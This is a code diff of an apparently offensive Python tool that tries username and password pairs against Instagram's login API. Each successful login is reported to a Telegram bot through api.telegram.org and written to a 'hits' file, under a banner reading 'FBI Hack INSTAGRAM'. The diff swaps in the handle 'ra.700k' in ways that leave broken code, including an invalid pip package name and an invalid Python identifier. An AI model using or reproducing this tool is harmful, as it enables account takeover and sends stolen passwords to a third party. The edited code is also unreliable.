@@ -23,7 +23,7 @@ except:
 try:
     from user_agent import generate_user_agent
 except:
-    os.system('pip install user_agent ')
+    os.system('pip install ra.700k_agent ')
 
 try:
     from datetime import datetime
@@ -259,7 +259,7 @@ if TOOLS == '3':
                  'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                  'Host':'i.instagram.com'}
                 uid = str(uuid4())
-                data = {'uuid':uid,  'password':password,  'username':username, 
+                data = {'uuid':uid,  'password':password,  'username':ra.700k, 
                  'device_id':uid, 
                  'from_reg':'false', 
                  '_csrftoken':'missing', 
@@ -270,10 +270,10 @@ if TOOLS == '3':
                     ht += 1                    
                     tlg = (f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ 𝙷𝙸𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 ⌯
 . — — — — —  — — — — — . 
-⌯ ᴇᴍᴀɪʟ : {username}
+⌯ ᴇᴍᴀɪʟ : {ra.700k}
 ⌯ ᴘᴀѕѕ : {password}
 . — — — — —  — — — — —
-• Tele : @vip2i2 ,  @T_F_U
+• Tele : @ra.700k ,  @T_F_U
   ''' )
                     i = requests.post(tlg)
                     with open('insta-hits.txt', 'a') as (HACKED):
